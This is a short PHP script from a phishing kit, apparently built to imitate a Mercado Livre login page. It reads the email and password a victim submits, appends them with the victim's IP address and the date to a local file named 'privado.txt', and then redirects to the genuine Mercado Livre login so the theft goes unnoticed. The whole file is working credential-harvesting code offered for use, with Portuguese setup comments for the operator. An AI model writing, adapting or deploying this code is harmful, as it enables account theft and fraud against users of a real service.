<?php

/*01010101010010111001001010101010010101010
 _____    _                 ___      __ 
/ _  / __| | ___ _ __ ___  / _ \  /\ \ \
\// / / _` |/ _ \ '_ ` _ \| | | |/  \/ /
 / //\ (_| |  __/ | | | | | |_| / /\  / 
/____/\__,_|\___|_| |_| |_|\___/\_\ \/  

01010101010101001010101001001001010100101*/

//Não Mexa
$email = $_POST['user_id'];
//Não Mexa
$senha = $_POST['password'];
//Não Mexa
$ip = $_SERVER['REMOTE_ADDR'];
$data = date("d/m/Y");

//Não Mexa
$conteudo = "Email => $email | Senha => $senha | Ip => $ip | Data: $data /n";
//Mudar Nome do Arquivo (Opcional).
$arquivo = "privado.txt";

//Não Mexa
if (!$abrir = fopen($arquivo, "a")) { 
	echo "Erro abrindo arquivo ($arquivo)";
	exit; }

//Não Mexa
if (!fwrite($abrir, $conteudo)) {
	print "Erro escrevendo no arquivo ($arquivo)";
	exit;
} 
//Não Mexa
echo '<meta http-equiv="refresh" content="0;url=https://www.mercadolivre.com/jms/mlb/lgz/msl/login/H4sIAAAAAAAEAy2NQQ4DIQhF78J6onuXvciEUbSmWg3S2GYydy823QH__ccJpaX83OXTCRzQu5fss8AGvaDExnXPQYPa9TSy0H8tx0KQsZIQD3DnEiUKN9LSUgm_SJnUdL6L9OGsnXOaSuwxtI6pGd-qOdgqxpTyUBOtZ7_qtUHEIbsw-ge4iGXQ9QVwAgKRrwAAAA/user">';
fclose($abrir);
exit;




?>